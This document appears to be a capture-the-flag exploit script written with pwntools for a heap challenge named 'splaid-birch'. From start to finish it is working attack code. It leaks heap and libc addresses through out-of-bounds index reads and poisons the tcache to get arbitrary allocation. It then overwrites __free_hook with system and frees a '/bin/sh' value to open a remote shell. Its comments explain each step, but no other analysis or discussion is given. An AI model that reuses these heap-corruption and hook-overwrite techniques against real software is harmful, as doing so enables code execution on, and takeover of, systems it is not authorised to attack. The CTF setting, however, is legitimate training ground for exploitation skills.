from pwn import *
from heaputils import get_PIE

def add(x,y):
	p.sendline("5")
	p.sendline(str(x))
	p.sendline(str(y))

def delete(idx):
	p.sendline("1")
	p.sendline(str(idx))

def select(idx):
	p.sendline("4")
	p.sendline(str(idx))
	return int(p.recvline().strip())

def find(x,y):
	p.sendline("6")
	p.sendline(str(x))
	p.sendline(str(y))
	return int(p.recvline().strip())

def getnth(n):
	p.sendline("3")
	p.sendline(str(n))
	return int(p.recvline().strip())

def find_and_add(x,y,incr):
	p.sendline("7")
	p.sendline(str(incr))
	p.sendline(str(x))
	p.sendline(str(y))

def debug():
	bp1 = PIE + 0xE00
	bp2 = PIE + 0xEC2
	bp3 = PIE + 0xD1A
 	script = "b *0x%x\n"%bp1
	script += "b *0x%x\n"%bp2
	script += "b *0x%x"%bp3
	gdb.attach(p,gdbscript=script)

if __name__ == "__main__":

	libc = ELF("./libc.so.6")

	p = remote("splaid-birch.pwni.ng",17579)

	for i in range(5):
		add(i,i)

	# delete 3 chunks
	delete(0)
	delete(1)
	delete(2)
	delete(3)
	delete(4)

	idx = (0x7fc6681fc370 - 0x7fc6681fb260)//8

	select(idx)
	HEAP = getnth(0)

	log.info("HEAP: 0x%x"%HEAP) # 0x7f68373c72d0
	

	# overwrite tcache structure to get any structure malloc'ed
	tcache_addr = HEAP + 0x7fdd994c2068 - 0x7fdd994c32d0
	parent_ptr = tcache_addr + 0x18

	# save the pointer to parent
	add(parent_ptr-0x28,parent_ptr-0x28)

	idx = (0x7f68373c7410 - 0x7f68373c6260)//8 #fake idx
	select(idx)

	add(0,0x1071) # victim where we are going to allocate

	victim = HEAP + 0x7fc26be543c0 - 0x7fc26be542d0
	log.info("victim: 0x%x"%victim)

	find_and_add(0,0,victim+0x10)

	# now we get a 0x1041 chunk allocated
	add(0x1, 0x2)

	

	# create lots of chunks so that we can bypass double free

	for i in range(0x24):
		add(i+0x3000,i+0x3000)

	add(0x1070,0x51) 
	add(0x51,0x101) 

	# we can create an unsorted chunk
	delete(0x1)

	# change tcache to get 0x1071 chunk's tree metadata allocated, faking a valid tree hierarchy
	find_and_add(0,0,victim + 0x38)
	add(parent_ptr+0x28,parent_ptr+0x28)

	# save pointer of 0x1071 chunk 
	find_and_add(0,0,HEAP)
	add(victim+0x10,0x1337)

	# using select change top to victim
	idx = (0x7fd54c84e2d0 - 0x7fd54c84f100)//8
	select(idx)

	# leak libc 
	LIBC = find(0xFF,-1) + 0x7fd9de909000 - 0x7fd9decf4ca0
	log.info("LIBC: 0x%x"%LIBC)

	system = LIBC + libc.symbols['system']
	free_hook = LIBC + libc.symbols['__free_hook']
	malloc_hook = LIBC + libc.symbols['__malloc_hook']

	# use arbitrary write primitive to obtain shell

	# change top to tcache (vector changes, so we need to update idx)
	tcache_addr = HEAP + 0x7fdd994c2068 - 0x7fdd994c32d0
	parent_ptr = tcache_addr + 0x18
	

	# save the pointer to parent
	
	idx = (0x7fa460d7e3d8 - 0x7fa460d7f100)//8
	
	add(parent_ptr-0x28,parent_ptr-0x28)
	select(idx)

	# get free_hook allocated on next turn
	find_and_add(0,0,free_hook)

	add(system,system)
	add(u64("/bin/sh\x00"),0)
	delete(0x0068732f6e69622f)

	p.interactive()